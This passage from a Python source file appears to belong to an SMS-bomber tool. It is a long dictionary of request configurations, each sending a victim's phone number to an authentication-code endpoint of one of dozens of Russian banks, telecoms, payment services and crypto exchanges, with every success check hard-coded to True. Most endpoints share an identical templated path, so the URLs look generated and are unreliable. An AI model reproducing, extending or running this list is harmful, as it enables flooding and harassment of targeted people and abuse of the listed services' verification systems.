        "url": "https://megafon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megafon.ru/", "https://megafon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api500": {
        "name": "Yota",
        "url": "https://yota.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yota.ru/", "https://yota.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api501": {
        "name": "Tele2Internet",
        "url": "https://tele2.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tele2.ru/", "https://tele2.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api502": {
        "name": "СберМобайл",
        "url": "https://sbermobile.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbermobile.ru/", "https://sbermobile.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api503": {
        "name": "ТинькоффМобайл",
        "url": "https://www.tinkoff.ru/mobile/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tinkoff.ru/", "https://www.tinkoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api504": {
        "name": "ВТБМобайл",
        "url": "https://vtb-mobile.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vtb-mobile.ru/", "https://vtb-mobile.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api505": {
        "name": "ГазпромбанкМобайл",
        "url": "https://gazprombankmobile.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gazprombankmobile.ru/", "https://gazprombankmobile.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api506": {
        "name": "СбербанкОнлайн",
        "url": "https://online.sberbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.sberbank.ru/", "https://online.sberbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api507": {
        "name": "АльфаКлик",
        "url": "https://click.alfabank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://click.alfabank.ru/", "https://click.alfabank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api508": {
        "name": "ТинькоффБанк",
        "url": "https://www.tinkoff.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.tinkoff.ru/", "https://www.tinkoff.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api509": {
        "name": "ВТБОнлайн",
        "url": "https://online.vtb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.vtb.ru/", "https://online.vtb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api510": {
        "name": "РайффайзенОнлайн",
        "url": "https://online.raiffeisen.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.raiffeisen.ru/", "https://online.raiffeisen.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api511": {
        "name": "ГазпромбанкОнлайн",
        "url": "https://online.gazprombank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.gazprombank.ru/", "https://online.gazprombank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api512": {
        "name": "ПромсвязьбанкОнлайн",
        "url": "https://online.psbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.psbank.ru/", "https://online.psbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api513": {
        "name": "СовкомбанкОнлайн",
        "url": "https://online.sovcombank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.sovcombank.ru/", "https://online.sovcombank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api514": {
        "name": "РосбанкОнлайн",
        "url": "https://online.rosbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.rosbank.ru/", "https://online.rosbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api515": {
        "name": "ПочтаБанкОнлайн",
        "url": "https://online.postbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.postbank.ru/", "https://online.postbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api516": {
        "name": "МКБОнлайн",
        "url": "https://online.mkb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.mkb.ru/", "https://online.mkb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api517": {
        "name": "УБРиРОнлайн",
        "url": "https://online.ubrr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.ubrr.ru/", "https://online.ubrr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api518": {
        "name": "ХовКредитОнлайн",
        "url": "https://online.homecredit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.homecredit.ru/", "https://online.homecredit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api519": {
        "name": "РенессансОнлайн",
        "url": "https://online.rencredit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.rencredit.ru/", "https://online.rencredit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api520": {
        "name": "ОТПБанкОнлайн",
        "url": "https://online.otpbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.otpbank.ru/", "https://online.otpbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api521": {
        "name": "АКБарсОнлайн",
        "url": "https://online.akbars.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.akbars.ru/", "https://online.akbars.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api522": {
        "name": "МТСБанкОнлайн",
        "url": "https://online.mtsbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.mtsbank.ru/", "https://online.mtsbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api523": {
        "name": "БанкСанктПетербургОнлайн",
        "url": "https://bspb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bspb.ru/", "https://bspb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api524": {
        "name": "ТочкаБанк",
        "url": "https://tochka.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tochka.com/", "https://tochka.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api525": {
        "name": "МодульБанк",
        "url": "https://modulbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://modulbank.ru/", "https://modulbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api526": {
        "name": "ДелоБанк",
        "url": "https://delobank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delobank.ru/", "https://delobank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api527": {
        "name": "ЛокоБанк",
        "url": "https://lockobank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lockobank.ru/", "https://lockobank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api528": {
        "name": "ЗенитБанк",
        "url": "https://zenit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zenit.ru/", "https://zenit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api529": {
        "name": "УралсибБанк",
        "url": "https://uralsib.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uralsib.ru/", "https://uralsib.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api530": {
        "name": "АбсолютБанк",
        "url": "https://absolutbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://absolutbank.ru/", "https://absolutbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api531": {
        "name": "РенессансКредит",
        "url": "https://rencredit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rencredit.ru/", "https://rencredit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api532": {
        "name": "КубаньКредит",
        "url": "https://kk.bank/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kk.bank/", "https://kk.bank", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api533": {
        "name": "ЦентрИнвест",
        "url": "https://centrinvest.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://centrinvest.ru/", "https://centrinvest.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api534": {
        "name": "Левобережный",
        "url": "https://novonko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://novonko.ru/", "https://novonko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api535": {
        "name": "МСПБанк",
        "url": "https://mspbank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mspbank.ru/", "https://mspbank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api536": {
        "name": "Экспобанк",
        "url": "https://expobank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://expobank.ru/", "https://expobank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api537": {
        "name": "Синко-Банк",
        "url": "https://synchobank.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://synchobank.ru/", "https://synchobank.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api538": {
        "name": "РБД",
        "url": "https://rbd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rbd.ru/", "https://rbd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api539": {
        "name": "Инвестторгбанк",
        "url": "https://itb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://itb.ru/", "https://itb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api540": {
        "name": "МТС-Деньги",
        "url": "https://money.mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://money.mts.ru/", "https://money.mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api541": {
        "name": "QIWIWallet",
        "url": "https://qiwi.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qiwi.com/", "https://qiwi.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api542": {
        "name": "ЮMoney",
        "url": "https://yoomoney.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yoomoney.ru/", "https://yoomoney.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api543": {
        "name": "WebMoney",
        "url": "https://webmoney.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://webmoney.ru/", "https://webmoney.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api544": {
        "name": "Payeer",
        "url": "https://payeer.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://payeer.com/", "https://payeer.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api545": {
        "name": "PerfectMoney",
        "url": "https://perfectmoney.is/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://perfectmoney.is/", "https://perfectmoney.is", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api546": {
        "name": "Advcash",
        "url": "https://advcash.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://advcash.com/", "https://advcash.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api547": {
        "name": "Binance",
        "url": "https://binance.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://binance.com/", "https://binance.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api548": {
        "name": "Bybit",
        "url": "https://bybit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bybit.com/", "https://bybit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api549": {
        "name": "OKX",
        "url": "https://okx.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okx.com/", "https://okx.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api550": {
        "name": "Huobi",
        "url": "https://huobi.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://huobi.com/", "https://huobi.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api551": {
        "name": "KuCoin",
        "url": "https://kucoin.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kucoin.com/", "https://kucoin.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api552": {
        "name": "GateIo",
        "url": "https://gate.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gate.io/", "https://gate.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api553": {
        "name": "Bitfinex",
        "url": "https://bitfinex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitfinex.com/", "https://bitfinex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api554": {
        "name": "Kraken",
        "url": "https://kraken.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kraken.com/", "https://kraken.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api555": {
        "name": "Coinbase",
        "url": "https://coinbase.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coinbase.com/", "https://coinbase.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api556": {
        "name": "LocalBitcoins",
        "url": "https://localbitcoins.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://localbitcoins.com/", "https://localbitcoins.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api557": {
        "name": "BestChange",
        "url": "https://bestchange.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bestchange.ru/", "https://bestchange.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api558": {
        "name": "P2P_Binance",
        "url": "https://p2p.binance.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://p2p.binance.com/", "https://p2p.binance.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api559": {
        "name": "Garantex",
        "url": "https://garantex.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://garantex.io/", "https://garantex.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api560": {
        "name": "Exmo",
        "url": "https://exmo.me/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://exmo.me/", "https://exmo.me", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api561": {
        "name": "Yobit",
        "url": "https://yobit.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yobit.net/", "https://yobit.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api562": {
        "name": "Livecoin",
        "url": "https://livecoin.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://livecoin.net/", "https://livecoin.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api563": {
        "name": "LocalCoins",
        "url": "https://localcoins.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://localcoins.com/", "https://localcoins.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api564": {
        "name": "HodlHodl",
        "url": "https://hodlhodl.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hodlhodl.com/", "https://hodlhodl.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api565": {
        "name": "Paxful",
        "url": "https://paxful.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://paxful.com/", "https://paxful.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api566": {
        "name": "Remitano",
        "url": "https://remitano.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://remitano.com/", "https://remitano.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api567": {
        "name": "CryptoCom",
        "url": "https://crypto.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://crypto.com/", "https://crypto.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api568": {
        "name": "CEX_IO",
        "url": "https://cex.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cex.io/", "https://cex.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api569": {
        "name": "Bitstamp",
        "url": "https://bitstamp.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitstamp.net/", "https://bitstamp.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api570": {
        "name": "Gemini",
        "url": "https://gemini.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gemini.com/", "https://gemini.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api571": {
        "name": "Poloniex",
        "url": "https://poloniex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://poloniex.com/", "https://poloniex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api572": {
        "name": "Bittrex",
        "url": "https://bittrex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bittrex.com/", "https://bittrex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api573": {
        "name": "HitBTC",
        "url": "https://hitbtc.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hitbtc.com/", "https://hitbtc.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api574": {
        "name": "LBank",
        "url": "https://lbank.info/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lbank.info/", "https://lbank.info", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api575": {
        "name": "MEXC",
        "url": "https://mexc.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mexc.com/", "https://mexc.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api576": {
        "name": "DigiFinex",
        "url": "https://digifinex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://digifinex.com/", "https://digifinex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api577": {
        "name": "Hotbit",
        "url": "https://hotbit.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hotbit.io/", "https://hotbit.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api578": {
        "name": "Coinex",
        "url": "https://coinex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coinex.com/", "https://coinex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api579": {
        "name": "BitMart",
        "url": "https://bitmart.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitmart.com/", "https://bitmart.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api580": {
        "name": "ProBit",
        "url": "https://probit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://probit.com/", "https://probit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api581": {
        "name": "AscendEX",
        "url": "https://ascendex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ascendex.com/", "https://ascendex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api582": {
        "name": "WhiteBit",
        "url": "https://whitebit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://whitebit.com/", "https://whitebit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api583": {
        "name": "Kanga",
        "url": "https://kanga.exchange/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kanga.exchange/", "https://kanga.exchange", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api584": {
        "name": "Coinstore",
        "url": "https://coinstore.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coinstore.com/", "https://coinstore.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api585": {
        "name": "XT_com",
        "url": "https://xt.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://xt.com/", "https://xt.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api586": {
        "name": "P2B",
        "url": "https://p2pb2b.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://p2pb2b.com/", "https://p2pb2b.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api587": {
        "name": "Coinsbit",
        "url": "https://coinsbit.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coinsbit.io/", "https://coinsbit.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api588": {
        "name": "BitForex",
        "url": "https://bitforex.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitforex.com/", "https://bitforex.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api589": {
        "name": "Bithumb",
        "url": "https://bithumb.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bithumb.com/", "https://bithumb.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api590": {
        "name": "Upbit",
        "url": "https://upbit.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://upbit.com/", "https://upbit.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api591": {
        "name": "Korbit",
        "url": "https://korbit.co.kr/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://korbit.co.kr/", "https://korbit.co.kr", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api592": {
        "name": "Coinone",
        "url": "https://coinone.co.kr/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coinone.co.kr/", "https://coinone.co.kr", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api593": {
        "name": "Gopax",
        "url": "https://gopax.co.kr/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gopax.co.kr/", "https://gopax.co.kr", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api594": {
        "name": "Zaif",
        "url": "https://zaif.jp/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zaif.jp/", "https://zaif.jp", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api595": {
        "name": "BitFlyer",
        "url": "https://bitflyer.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitflyer.com/", "https://bitflyer.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api596": {
        "name": "Coincheck",
        "url": "https://coincheck.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coincheck.com/", "https://coincheck.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api597": {
        "name": "GMO_Coin",
        "url": "https://coin.z.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coin.z.com/", "https://coin.z.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api598": {
        "name": "DMM_Bitcoin",
        "url": "https://bitcoin.dmm.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bitcoin.dmm.com/", "https://bitcoin.dmm.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api599": {
        "name": "RakutenWallet",
        "url": "https://wallet.rakuten.co.jp/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wallet.rakuten.co.jp/", "https://wallet.rakuten.co.jp", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api600": {
        "name": "BinanceUS",
        "url": "https://binance.us/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://binance.us/", "https://binance.us", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api601": {
        "name": "KrakenUS",
        "url": "https://kraken.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kraken.com/", "https://kraken.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api602": {
        "name": "CoinbasePro",
        "url": "https://pro.coinbase.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pro.coinbase.com/", "https://pro.coinbase.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api603": {
        "name": "GeminiActive",
        "url": "https://gemini.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gemini.com/", "https://gemini.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api604": {
        "name": "CryptoComExchange",
        "url": "https://crypto.com/exchange/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://crypto.com/", "https://crypto.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api605": {
        "name": "RobinhoodCrypto",
        "url": "https://robinhood.com/crypto/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://robinhood.com/", "https://robinhood.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api606": {
        "name": "WebullCrypto",
        "url": "https://webull.com/crypto/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://webull.com/", "https://webull.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api607": {
        "name": "RevolutCrypto",
        "url": "https://revolut.com/crypto/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://revolut.com/", "https://revolut.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api608": {
        "name": "PayPalCrypto",
        "url": "https://paypal.com/crypto/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://paypal.com/", "https://paypal.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api609": {
        "name": "CashAppCrypto",
        "url": "https://cash.app/crypto/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cash.app/", "https://cash.app", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api610": {
        "name": "BlockFi",
        "url": "https://blockfi.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://blockfi.com/", "https://blockfi.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api611": {
        "name": "Celsius",
        "url": "https://celsius.network/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://celsius.network/", "https://celsius.network", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api612": {
